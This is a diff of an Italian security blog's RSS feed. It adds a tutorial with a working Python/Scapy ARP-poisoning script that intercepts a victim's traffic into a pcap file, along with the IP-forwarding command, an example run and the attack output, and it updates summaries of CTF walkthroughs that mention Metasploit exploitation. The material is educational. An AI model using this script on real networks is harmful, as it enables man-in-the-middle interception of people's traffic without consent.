+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Beginning the ARP poison. [CTRL-C to stop]&amp;#39;&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
+            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+                send(poison_victim)
+                send(poison_gateway)
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
+                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restore()
+                sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+                time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
+        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sniffing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; packets&amp;#39;&lt;/span&gt;)
+        bpf_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip host &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; victim
+        packets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sniff(count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;count, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bpf_filter, iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface)
+        wrpcap(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arper.pcap&amp;#39;&lt;/span&gt;, packets)
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Got the packets&amp;#39;&lt;/span&gt;)
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restrore()
+        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminate()
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Finished.&amp;#39;&lt;/span&gt;)
+        
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restrore&lt;/span&gt;(self):
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Restoring ARP Tables...&amp;#39;&lt;/span&gt;)
+        send(ARP(
+            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
+            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
+            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac, 
+            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
+            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
+            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+        send(ARP(
+            op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, 
+            psrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim, 
+            hwsrc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac, 
+            pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway, 
+            hwdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;), 
+            count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    (victim, gateway, interface) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
+    myarp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arper(victim, gateway, interface)
+    myarp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Prima di avviare l’attacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo echo &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/net/ipv4/ip_forward
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora che l’IP forwarding è stato importato, avviamo lo script con:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo python3 arper.py &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;IP vittima&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;IP gateway&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;interface&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ad esempio:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;L’output durante l’attacco:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
+? &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.176&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Si vede che la vittima malcapitata ha una cache ARP compromessa, poichè il gateway risulta avere lo stesso indirizzo MAC dell’attaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
       <title>Walkthrough Explore</title>
       <link>https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/</guid>
-      <description>Enumerazione con Nmap Analisi delle porte  Sfruttamento dell’Exploit con Metasploit Sfruttamento dell’Exploit con CVE (Script Python)   Privilage Escalation  Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina.</description>
-      <content>&lt;ul&gt;
+      <description>Table of Contents:
+ Enumerazione con Nmap Analisi delle porte  Sfruttamento dell’Exploit con Metasploit Sfruttamento dell’Exploit con CVE (Script Python)   Privilage Escalation  Explore è una macchina Android di facile difficoltà. L’enumerazione della rete rivela un servizio vulnerabile, sfruttabile tramite un modulo Metasploit e fornisce un accesso in lettura limitato alla macchina. Un’ulteriore enumerazione dei file, rivela le credenziali SSH di un utente del sistema, consentendo così l’accesso remoto alla macchina.</description>
+      <content>&lt;p&gt;Table of Contents:&lt;/p&gt;
+&lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#enumerazione-con-nmap&#34;&gt;Enumerazione con Nmap&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;#analisi-delle-porte&#34;&gt;Analisi delle porte&lt;/a&gt;
 &lt;ul&gt;
@@ -317,11 +630,13 @@ Questo sito web indica anche una vulnerabilità nota per questa applicazione, in
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://kobra3390.github.io/SpaceHack/posts/walkthrough-meow/walkthrough_meow_ctf/</guid>
-      <description>Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa è stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.
+      <description>Table Of Contents:
+ Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa è stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.
 Il comando é:
 nmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L&amp;rsquo;output:
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.</description>
-      <content>&lt;ul&gt;
+      <content>&lt;p&gt;Table Of Contents:&lt;/p&gt;
+&lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#enumerazione-con-nmap&#34;&gt;Enumerazione con Nmap&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;#connessione-a-telnet&#34;&gt;Connessione a Telnet&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
